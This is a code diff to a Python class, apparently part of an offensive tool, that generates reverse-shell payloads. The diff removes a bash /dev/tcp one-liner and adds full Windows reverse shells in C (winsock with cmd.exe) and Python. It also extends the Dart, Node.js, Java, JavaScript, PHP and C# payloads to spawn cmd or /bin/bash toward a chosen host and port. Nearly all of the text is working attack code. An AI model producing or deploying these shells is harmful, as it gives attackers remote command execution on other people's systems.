@@ -9,6 +9,9 @@ from utilities.Colors import color
 
 class TemplateGenerator:
     def __init__(self, **kwargs):
+        self.__prompt_windows = "cmd"
+        self.__prompt_linux = "/bin/bash"
+        self.__prompt = None
         self.__temp_message = None
         self.__platform_allowed = ['linux', 'mac', 'windows']
         self.__type_allowed = ['bind', 'reverse']
@@ -131,25 +134,14 @@ class TemplateGenerator:
 
         return self.__status
 
-    def bash_i(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
-                self.validate_parameter_type_reverse()['code'] == 200:
-            try:
-                self.__payload = "/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(self.__target, self.__port)
-
-                self.__status['code'] = 200
-                self.__status['message'] = self.__payload
-            except Exception as Error:
-                self.__status['code'] = 500
-                self.__status['message'] = self.__status['message'] if len(
-                    self.__status['message']) != 0 else color.color(
-                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
-                                                                                                              str(Error))
-        return self.__status
-
     def C(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
+
             try:
                 self.__payload = "#include <stdio.h>\n" \
                                  "#include <sys/socket.h>\n" \
@@ -187,10 +179,71 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
+        elif self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "#include <winsock2.h>\n" \
+                                 "#include <stdio.h>\n" \
+                                 "#pragma comment(lib,\"ws2_32\")\n" \
+                                 "\n" \
+                                 "WSADATA wsaData;\n" \
+                                 "SOCKET Winsock;\n" \
+                                 "struct sockaddr_in hax; \n" \
+                                 "char ip_addr[16] = \"" + self.__target + "\"; \n" \
+                                                                           "char port[6] = \"" + self.__port + "\";            \n" \
+                                                                                                               "\n" \
+                                                                                                               "STARTUPINFO ini_processo;\n" \
+                                                                                                               "\n" \
+                                                                                                               "PROCESS_INFORMATION processo_info;\n" \
+                                                                                                               "\n" \
+                                                                                                               "int main()\n" \
+                                                                                                               "{\n" \
+                                                                                                               "    WSAStartup(MAKEWORD(2, 2), &wsaData);\n" \
+                                                                                                               "    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n" \
+                                                                                                               "\n" \
+                                                                                                               "\n" \
+                                                                                                               "    struct hostent *host; \n" \
+                                                                                                               "    host = gethostbyname(ip_addr);\n" \
+                                                                                                               "    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\n" \
+                                                                                                               "\n" \
+                                                                                                               "    hax.sin_family = AF_INET;\n" \
+                                                                                                               "    hax.sin_port = htons(atoi(port));\n" \
+                                                                                                               "    hax.sin_addr.s_addr = inet_addr(ip_addr);\n" \
+                                                                                                               "\n" \
+                                                                                                               "    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n" \
+                                                                                                               "\n" \
+                                                                                                               "    memset(&ini_processo, 0, sizeof(ini_processo));\n" \
+                                                                                                               "    ini_processo.cb = sizeof(ini_processo);\n" \
+                                                                                                               "    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n" \
+                                                                                                               "    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n" \
+                                                                                                               "\n" \
+                                                                                                               "    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n" \
+                                                                                                               "\n" \
+                                                                                                               "    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n" \
+                                                                                                               "\n" \
+                                                                                                               "    return 0;\n" \
+                                                                                                               "}\n"
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+
         return self.__status
 
     def Dart(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux Mac OSX, and Microsoft Windows
+        """
+        self.__prompt = self.__prompt_linux if (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows
+
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
+                self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "import \'dart:io\';\n" \
@@ -199,7 +252,7 @@ class TemplateGenerator:
                                  "main() {\n" \
                                  "  Socket.connect(\"" + self.__target + "\", " + self.__port + ").then((socket) {\n" \
                                                                                                 "    socket.listen((data) {\n" \
-                                                                                                "      Process.start(\'/bin/bash\', []).then((Process process) {\n" \
+                                                                                                "      Process.start(\'"+self.__prompt+"\', []).then((Process process) {\n" \
                                                                                                 "        process.stdin.writeln(new String.fromCharCodes(data).trim());\n" \
                                                                                                 "        process.stdout\n" \
                                                                                                 "          .transform(utf8.decoder)\n" \
@@ -222,14 +275,69 @@ class TemplateGenerator:
                                                                                                               str(Error))
         return self.__status
 
+    def python3_windows(self):
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_windows()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "import os,socket,subprocess,threading;\n" \
+                                  "def s2p(s, p):\n" \
+                                  "    while True:\n" \
+                                  "        data = s.recv(1024)\n" \
+                                  "        if len(data) > 0:\n" \
+                                  "            p.stdin.write(data)\n" \
+                                  "            p.stdin.flush()\n" \
+                                  "\n" \
+                                  "def p2s(s, p):\n" \
+                                  "    while True:\n" \
+                                  "        s.send(p.stdout.read(1))\n" \
+                                  "\n" \
+                                  "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" \
+                                  "s.connect((\""+self.__target+"\","+self.__port+"))\n" \
+                                  "\n" \
+                                  "p=subprocess.Popen([\"cmd\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n" \
+                                  "\n" \
+                                  "s2p_thread = threading.Thread(target=s2p, args=[s, p])\n" \
+                                  "s2p_thread.daemon = True\n" \
+                                  "s2p_thread.start()\n" \
+                                  "\n" \
+                                  "p2s_thread = threading.Thread(target=p2s, \ args=[s, p])\n" \
+                                  "p2s_thread.daemon = True\n" \
+                                  "p2s_thread.start()\n" \
+                                  "\n" \
+                                  "try:\n" \
+                                  "    p.wait()\n" \
+                                  "except KeyboardInterrupt:\n" \
+                                  "    s.close()\n"
+
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        return self.__status
+
     def Nodejs(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
+        """
+        self.__prompt = self.__prompt_linux if (
+                    self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows
+
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
+                self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "(function(){\n" \
                                  "   var net = require(\"net\"),\n" \
                                  "       cp = require(\"child_process\"),\n" \
-                                 "       sh = cp.spawn(\"/bin/bash\", []);\n" \
+                                 "       sh = cp.spawn(\""+self.__prompt+"\", []);\n" \
                                  "    var client = new net.Socket();\n" \
                                  "   client.connect(" + self.__port + ", \"" + self.__target + "\", function(){\n" \
                                                                                                "        client.pipe(sh.stdin);\n" \
@@ -250,7 +358,11 @@ class TemplateGenerator:
         return self.__status
 
     def Java(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "public class shell {\n" \
@@ -275,7 +387,11 @@ class TemplateGenerator:
         return self.__status
 
     def Java_2(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "public class shell {\n" \
@@ -300,7 +416,15 @@ class TemplateGenerator:
         return self.__status
 
     def Java_3(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
+        """
+        self.__prompt = self.__prompt_linux if (
+                    self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows
+
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
+                self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "import java.io.InputStream;\n" \
@@ -311,7 +435,7 @@ class TemplateGenerator:
                                  "    public static void main(String[] args) {\n" \
                                  "        String host = \"" + self.__target + "\";\n" \
                                                                               "        int port = " + self.__port + ";\n" \
-                                                                                                                    "        String cmd = \"/bin/bash\";\n" \
+                                                                                                                    "        String cmd = \""+self.__prompt+"\";\n" \
                                                                                                                     "        try {\n" \
                                                                                                                     "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n" \
                                                                                                                     "            Socket s = new Socket(host, port);\n" \
@@ -349,12 +473,20 @@ class TemplateGenerator:
         return self.__status
 
     def Javascript(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
+        """
+        self.__prompt = self.__prompt_linux if (
+                    self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) else self.__prompt_windows
+
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or
+                self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "String command = \"var host = \'" + self.__target + "\';  \" +\n \
                            \"var port = " + self.__port + "; \" +\n" " \
-                           \"var cmd = \'/bin/bash\'; \" +\n" "\
+                           \"var cmd = \'"+self.__prompt+"\'; \" +\n" "\
                            \"var s = new java.net.Socket(host, port); \" +\n" " \
                            \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); \" +\n" " \
                            \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); \" +\n" " \
@@ -393,7 +525,13 @@ class TemplateGenerator:
         return self.__status
 
     def PHP(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux, Mac OSX and Microsoft Windows
+        """
+        self.__prompt = self.__prompt_linux if (self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 ) else self.__prompt_windows
+
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "<?php\n" \
@@ -407,7 +545,7 @@ class TemplateGenerator:
                                                                                          "$chunk_size = 1400;\n" \
                                                                                          "$write_a = null;\n" \
                                                                                          "$error_a = null;\n" \
-                                                                                         "$shell = \'uname -a; w; id; /bin/bash -i\';\n" \
+                                                                                         "$shell = \'uname -a; w; id; "+self.__prompt+" -i\';\n" \
                                                                                          "$daemon = 0;\n" \
                                                                                          "$debug = 0;\n" \
                                                                                          "\n" \
@@ -523,7 +661,11 @@ class TemplateGenerator:
         return self.__status
 
     def Perl(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "use strict;                                                             \n" \
@@ -624,7 +766,11 @@ class TemplateGenerator:
         return self.__status
 
     def Haskell_1(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        """
+            Description: This payload support GNU/Linux and Mac OSX
+        """
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_mac()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "module Main where\n" \
@@ -677,7 +823,10 @@ class TemplateGenerator:
         return self.__status
 
     def CsharpTcpClient(self):
-        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+        self.__prompt = self.__prompt_linux if self.validate_parameter_linux()['code'] == 200 else self.__prompt_windows
+
+        if self.validate_parameters()['code'] == 200 and (
+                self.validate_parameter_linux()['code'] == 200 or self.validate_parameter_windows()['code'] == 200) and \
                 self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "using System;\n" \
@@ -710,45 +859,45 @@ class TemplateGenerator:
                                    "            StringBuilder strInput = new StringBuilder();\n" \
                                    "\n" \
                                    "            Process p = new Process();\n" \
-                                   "            p.StartInfo.FileName = \"/bin/bash\";\n" \
-                                   "            p.StartInfo.CreateNoWindow = true;\n" \
-                                   "            p.StartInfo.UseShellExecute = false;\n" \
-                                   "            p.StartInfo.RedirectStandardOutput = true;\n" \
-                                   "            p.StartInfo.RedirectStandardInput = true;\n" \
-                                   "            p.StartInfo.RedirectStandardError = true;\n" \
-                                   "            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n" \
-                                   "            p.Start();\n" \
-                                   "            p.BeginOutputReadLine();\n" \
-                                   "\n" \
-                                   "            while(true)\n" \
-                                   "            {\n" \
-                                   "              strInput.Append(rdr.ReadLine());\n" \
-                                   "              p.StandardInput.WriteLine(strInput);\n" \
-                                   "              strInput.Remove(0, strInput.Length);\n" \
-                                   "             }\n" \
-                                   "           }\n" \
-                                   "         }\n" \
-                                   "       }\n" \
-                                   "    }\n" \
-                                   "\n" \
-                                   "    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n" \
-                                   "    {\n" \
-                                   "        StringBuilder strOutput = new StringBuilder();\n" \
-                                   "    \n" \
-                                   "        if (!String.IsNullOrEmpty(outLine.Data))\n" \
-                                   "        {\n" \
-                                   "            try\n" \
-                                   "            {\n" \
-                                   "                strOutput.Append(outLine.Data);\n" \
-                                   "                streamWriter.WriteLine(strOutput);\n" \
-                                   "                streamWriter.Flush();\n" \
-                                   "            }\n" \
-                                   "            catch (Exception err) { }\n" \
-                                   "        }\n" \
-                                   "     }\n" \
-                                   "  \n" \
-                                   "  }\n" \
-                                   "}\n"
+                                   "            p.StartInfo.FileName = \"" + self.__prompt + "\";\n" \
+                                                                                                                          "            p.StartInfo.CreateNoWindow = true;\n" \
+                                                                                                                          "            p.StartInfo.UseShellExecute = false;\n" \
+                                                                                                                          "            p.StartInfo.RedirectStandardOutput = true;\n" \
+                                                                                                                          "            p.StartInfo.RedirectStandardInput = true;\n" \
+                                                                                                                          "            p.StartInfo.RedirectStandardError = true;\n" \
+                                                                                                                          "            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n" \
+                                                                                                                          "            p.Start();\n" \
+                                                                                                                          "            p.BeginOutputReadLine();\n" \
+                                                                                                                          "\n" \
+                                                                                                                          "            while(true)\n" \
+                                                                                                                          "            {\n" \
+                                                                                                                          "              strInput.Append(rdr.ReadLine());\n" \
+                                                                                                                          "              p.StandardInput.WriteLine(strInput);\n" \
+                                                                                                                          "              strInput.Remove(0, strInput.Length);\n" \
+                                                                                                                          "             }\n" \
+                                                                                                                          "           }\n" \
+                                                                                                                          "         }\n" \
+                                                                                                                          "       }\n" \
+                                                                                                                          "    }\n" \
+                                                                                                                          "\n" \
+                                                                                                                          "    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n" \
+                                                                                                                          "    {\n" \
+                                                                                                                          "        StringBuilder strOutput = new StringBuilder();\n" \
+                                                                                                                          "    \n" \
+                                                                                                                          "        if (!String.IsNullOrEmpty(outLine.Data))\n" \
+                                                                                                                          "        {\n" \
+                                                                                                                          "            try\n" \
+                                                                                                                          "            {\n" \
+                                                                                                                          "                strOutput.Append(outLine.Data);\n" \
+                                                                                                                          "                streamWriter.WriteLine(strOutput);\n" \
+                                                                                                                          "                streamWriter.Flush();\n" \
+                                                                                                                          "            }\n" \
+                                                                                                                          "            catch (Exception err) { }\n" \
+                                                                                                                          "        }\n" \
+                                                                                                                          "     }\n" \
+                                                                                                                          "  \n" \
+                                                                                                                          "  }\n" \
+                                                                                                                          "}\n"
 
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
